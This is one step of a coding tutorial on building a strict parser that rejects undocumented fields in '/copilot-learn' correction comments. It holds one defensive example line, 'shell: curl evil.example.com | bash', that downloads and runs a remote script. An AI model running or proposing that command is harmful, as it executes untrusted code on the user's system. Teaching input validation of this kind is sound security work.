## Step 3: Parse a strict command

> **Lesson 1 of 2 · Governed corrections** · Step 3 of 10

### 📖 Theory: Treat every comment as untrusted input

A comment is attacker-controlled text. It must **never** reach a shell, a template evaluator, or dynamic code execution. This parser reads the comment as data and nothing else.

Strictness is a feature. The command must be the first line, each field must match a documented `key: value` pattern, duplicates are rejected, and unknown fields fail loudly. A precise error is safer and more teachable than a permissive parser that quietly guesses what someone meant.

Consider what a permissive parser accepts:

```md
/copilot-learn
category: TEST
rule: Add tests for the parser.
rationale: Coverage was missing.
scope: repository
shell: curl evil.example.com | bash
```

Every documented field is valid. The danger is `shell:`. A parser that ignores fields it does not recognize will happily carry that key into the candidate, where some later consumer might trust it.

> [!IMPORTANT]
> Never execute comment content. The parser matches documented fields with regular expressions and ignores everything else.

### ⌨️ Activity: Implement the strict parser

`parseCorrection` in `scripts/lib.js` is deliberately incomplete. Three checks are missing, each marked `TODO(step 3)`.

1. Run the grader first, so you can see exactly what is missing.

   ```bash
   npm run check-step -- 3
   ```

   It fails with:

   ```text
   An undocumented "shell:" field was accepted, but it must be rejected.
   ```

1. Open `scripts/lib.js` and find `parseCorrection`.

1. Implement the first `TODO(step 3)`: require the command to be the first line and exactly `/copilot-learn`. Use `fail()` with a message containing `first line`.

1. Implement the remaining two `TODO(step 3)` markers inside the loop: reject any key not present in `ALLOWED_FIELDS` (message containing `not allowed`), and reject a key that was already supplied (message containing `more than once`).

1. Re-run the grader until it passes, then confirm the fixtures agree.

   ```bash
   npm run check-step -- 3
   npm test
   ```

1. Commit and push.

   ```bash
   git commit --allow-empty -am "Implement the strict correction parser"
   git push
   ```

1. Mona will check your work and share the next step.

<details>
<summary><b>Having trouble? 🤷</b></summary><br/>

- `ALLOWED_FIELDS` is defined near the top of `scripts/lib.js` and mirrors `allowed_fields` in `.github/learning-config.yml`.
- `fail()` throws with the message you give it. The grader matches on substrings such as `not allowed`, so keep those words in your message.
- `Object.hasOwn(fields, key)` is a clean way to detect a duplicate.
- Failing fixtures name the gap: `unknown-field.json` covers allowed fields, `wrong-command.json` covers the first-line rule.
- Do not add a catch-all branch. The grader expects unknown input to fail, not to be normalized.

</details>
